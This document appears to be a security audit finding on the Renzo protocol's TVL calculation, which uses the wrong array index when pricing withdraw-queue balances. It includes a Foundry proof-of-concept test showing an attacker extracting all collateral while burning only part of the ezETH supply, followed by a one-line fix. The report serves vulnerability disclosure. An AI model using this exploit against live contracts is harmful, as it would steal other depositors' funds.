# Vulnerability details

The [`RestakeManager.calculateTVLs()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/RestakeManager.sol#L274) function serves the purpose of calculating the total value (in ETH equivalent) locked in the protocol.

Among the different contributions, there is the value coming from the token balance(s) held by the [`WithdrawQueue`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Withdraw/WithdrawQueue.sol) contract:


If we look at L318, we can see that the contribution is calculated with the price of `collateralTokens[i]` and the balance of `collateralTokens[j]`.

This is incorrect because `i` is always `0` (because `withdrawQueueTokenBalanceRecorded` is `false` only when `i == 0`), and generally different from `j`.

Because of this, the TVL calculation will apply the price of the first collateral to all the tokens held by the `WithdrawQueue` contract, and this will most likely cause the TVL to be incorrectly deflated or inflated depending on how collateral prices differ from each other over time.

## Impact
As the protocol TVL is used in different places, there are several impacts to this finding:
- TVL inflation can cause:
  - unfairly high collateral withdraws, leading ezETH owners to see their tokens become worthless (liquidity stolen, see PoC below) 
  - premature hitting of the `maxDepositTVL` threshold (availability impact)
- TVL deflation can cause:
  - unfairly low collateral withdraws, leading to collateral left over in the protocol once all ezETH is withdrawn (liquidity locked)
  - artificially passing the `maxDepositTVL` threshold (low impact)

## Proof of Concept
The following PoC in Foundry shows how the issue can be exploited to extract all the collaterals while burning only part of the ezETH supply. The PoC can be run in Foundry by using the setup and mock infra provided here -> https://gist.github.com/3docSec/a4bc6254f709a6218907a3de370ae84e

```Solidity
pragma solidity ^0.8.19;

import "contracts/Errors/Errors.sol";
import "./Setup.sol";

contract H1 is Setup {

    function testH1() public {
        // for this PoC to work, one of the collaterals 
        // has significantly higher price than the first one
        stEthPriceOracle.setAnswer(2e18);
        cbEthPriceOracle.setAnswer(1e18);
        
        // we set the buffer to something reasonably high
        WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);

        buffers[0] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(stETH),
                50e18 // bufferAmount
            );

        buffers[1] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(cbETH),
                100e18 // bufferAmount
            );

        vm.startPrank(OWNER);
        withdrawQueue.updateWithdrawBufferTarget(buffers);

        // we start with 0 tvl
        (, , uint tvl) = restakeManager.calculateTVLs();
        assertEq(0, tvl);

        // Alice deposits the mis-calculated token
        address alice = address(1234567890);
        cbETH.mint(alice, 100e18 + 1);
        vm.startPrank(alice);
        cbETH.approve(address(restakeManager), 100e18 + 1);
        restakeManager.deposit(IERC20(address(cbETH)), 100e18 + 1);

        (, , tvl) = restakeManager.calculateTVLs();

        // 🚨 TVL should be 100e18 because cbETH is priced at 1, 
        // it's instead miscalculated at 200e18
        assertEq(200e18 + 1, tvl);
        assertEq(100e18 + 1, ezETH.balanceOf(alice));

        // Now Alice withdraws half of their balance
        ezETH.approve(address(withdrawQueue), 50e18);
        withdrawQueue.withdraw(50e18, address(cbETH));

        vm.warp(block.timestamp + 10 days);
        withdrawQueue.claim(0);

        // 🚨 now there is 50e18 ezETH supply backed by 0 collateral
        // This means that if there were other ezETH holders, Alice
        // would've been able to steal their collateral
        assertEq(50e18 + 1, ezETH.totalSupply());
        (, , tvl) = restakeManager.calculateTVLs();
        assertEq(3, tvl);
    }
}
```

## Recommended Mitigation Steps
Replace `i` with the proper index `j`:
```diff
	if (!withdrawQueueTokenBalanceRecorded) {
		totalWithdrawalQueueValue += renzoOracle.lookupTokenValue(
-                       collateralTokens[i],
+                       collateralTokens[j],
			collateralTokens[j].balanceOf(withdrawQueue)
		);
	}
```
